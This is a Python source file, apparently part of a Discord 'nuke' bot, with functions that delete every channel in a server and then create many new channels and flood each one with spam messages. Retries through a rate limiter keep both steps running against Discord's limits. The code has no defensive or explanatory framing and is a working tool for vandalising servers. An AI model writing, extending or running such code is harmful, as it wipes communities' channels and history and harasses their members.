import asyncio
import discord
from typing import List
from src.core.config import Nuke
from src.operations.ratelimiter import rate_limiter


async def create_channels_and_spam(
    guild: discord.Guild
) -> List[discord.TextChannel]:
    created_channels = []
    
    async def create_channel():
        try:
            channel = await rate_limiter.execute_with_retry(
                "create_channel",
                guild.create_text_channel,
                Nuke.channel_name
            )
            created_channels.append(channel)
            return channel
        except Exception:
            return None
    
    tasks = [create_channel() for _ in range(Nuke.channel_count)]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    created_channels = [r for r in results if isinstance(r, discord.TextChannel)]
    
    async def spam_channel(channel: discord.TextChannel):
        for _ in range(Nuke.spam_count):
            try:
                await rate_limiter.execute_with_retry(
                    f"spam_{channel.id}",
                    channel.send,
                    Nuke.spam_message
                )
            except Exception:
                pass
    
    spam_tasks = [spam_channel(channel) for channel in created_channels]
    await asyncio.gather(*spam_tasks, return_exceptions=True)
    
    return created_channels


async def delete_channels(guild: discord.Guild) -> int:
    channels = [c for c in guild.channels if isinstance(c, (discord.TextChannel, discord.VoiceChannel, discord.CategoryChannel, discord.StageChannel, discord.ForumChannel))]
    
    async def delete_channel(channel):
        try:
            await rate_limiter.execute_with_retry(
                f"delete_{channel.id}",
                channel.delete
            )
            return True
        except Exception:
            return False
    
    tasks = [delete_channel(channel) for channel in channels]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    return sum(1 for r in results if r is True)